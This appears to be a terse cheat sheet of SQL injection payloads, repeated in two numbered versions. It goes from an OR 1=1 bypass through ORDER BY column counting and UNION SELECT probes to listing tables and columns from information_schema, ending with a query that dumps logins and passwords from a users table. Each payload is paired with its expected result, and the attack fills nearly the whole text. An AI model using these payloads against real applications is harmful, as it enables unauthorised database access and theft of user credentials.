' OR  1=1#
    Display all data


' OR 1=1 union select 1,database(),3,4,5,6,7#
  Display Database Name with column Number


' OR  1=1 ORDER BY 5#
Checking in Increasing Order 


' OR  1=1 ORDER BY 7#
Checking the number of columns


' OR  1=1 ORDER BY 8#
Unknown Error in order clause

        
' OR  1=1 UNION SELECT 1,2,3,4,5,6,7#
Display content with column Number


' and  1=1 UNION SELECT 1,2,3,4,5,6,7#
DIsplay column number only        No Extra Information


' and 1=0 union select 1,table_name,3,4,5,6,7 from information_schema.tables#
Display Table Names in Database 


' and 1=0 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'#
  Display columns using table name(users)


' and 1=0 union select 1,id,login,4,password,6,7 from users# 
 Display user names and password








1)' OR  1=1#
output:-displays all the data

2)' or  1=1 union select 1,database(),3,4,5,6,7#
output:-to display the database name

3)' OR  1=1 ORDER BY 5# or 7#
output:-arrange table in increasing order & find out the number of columns

4)' OR  1=1 ORDER BY 9#
output:-error unknown column 9 in order clause

        
5)' or  1=1 UNION SELECT 1,2,3,4,5,6,7#
output:-it will display the content with column number

6)' and 1=0 UNION SELECT 1,2,3,4,5,6,7#
output:-it will displays only column number and removes all extra content

7)' and 1=0 union select 1,table_name,3,4,5,6,7 from information_schema.tables#
output:-print all the tables in the database

8)' and 1=0 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'#
output:-print all the column from table name user

9)' and 1=0 union select 1,id,login,4,password,6,7 from users# 
output:-displays user name with password


